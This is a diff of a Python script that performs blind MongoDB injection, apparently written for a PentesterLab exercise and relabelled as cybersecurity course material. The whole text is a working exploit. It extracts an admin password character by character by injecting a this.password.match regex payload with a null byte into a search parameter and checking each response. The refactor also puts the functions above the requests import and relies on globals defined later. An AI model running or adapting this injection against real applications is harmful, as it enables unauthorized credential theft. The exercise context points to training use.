@@ -1,4 +1,21 @@
-'''Pentesterlab - MongoDB Injection 02'''
+'''Retrieve password from a mock server, for a cybersecurity course'''
+
+def get_match(url):
+    response=requests.get(url)
+    POSITION_FIRST_OCURRENCE_OF_ADMIN = 1355
+    INFINITE_NUMBER = 50000
+    return response.text.find('admin',POSITION_FIRST_OCURRENCE_OF_ADMIN ,INFINITE_NUMBER)
+
+
+def get_password(url):
+    for str_input in list_str_input:
+        password_updated = password + str_input
+        print(f'password_updated: {password_updated}')
+        query_params = f"?search=admin'%20%26%26%20this.password.match(/^{password_updated}.*/)%00"
+        match = get_match(f'{url}/{query_params}')
+        if match != -1:
+            return password_updated
+
 
 import requests
 
@@ -14,24 +31,7 @@ list_str_input = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f
 PASS_LENGTH=36
 
 
-def get_match(url):
-    response=requests.get(url)
-    POSITION_FIRST_OCURRENCE_OF_ADMIN = 1355
-    INFINITE_NUMBER = 50000
-    return response.text.find('admin',POSITION_FIRST_OCURRENCE_OF_ADMIN ,INFINITE_NUMBER)
-
-
-def get_char():
-    for str_input in list_str_input:
-        password_updated = password + str_input
-        #print(f'letter: {char}')
-        print(f'password_updated: {password_updated}')
-        str_filter = f"/?search=admin'%20%26%26%20this.password.match(/^{password_updated}.*/)%00"
-        match = get_match(url+str_filter)
-        if match != -1:
-            return password_updated
-
-
 while len(password) < PASS_LENGTH:
-    password = get_char()
-    print(f'password: {password}')
+    password = get_password(url)
+
+
